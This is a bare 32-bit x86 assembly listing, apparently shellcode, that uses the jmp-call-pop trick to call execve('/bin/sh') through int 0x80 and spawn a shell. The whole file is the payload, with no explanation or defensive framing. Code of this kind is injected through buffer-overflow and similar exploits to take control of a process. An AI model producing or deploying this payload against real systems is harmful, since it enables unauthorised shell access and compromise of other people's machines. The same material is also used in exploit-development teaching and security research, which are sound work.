bits 32
section .text
global _start

_start:
	jmp binsh

	exec:
	
	; execve("/bin/sh", NULL, NULL)
	
	xor eax, eax
	xor ecx, ecx
	xor edx, edx
	mov al, 0xb
	pop ebx

	int 0x80

	binsh:
		call exec
		db "/bin/sh"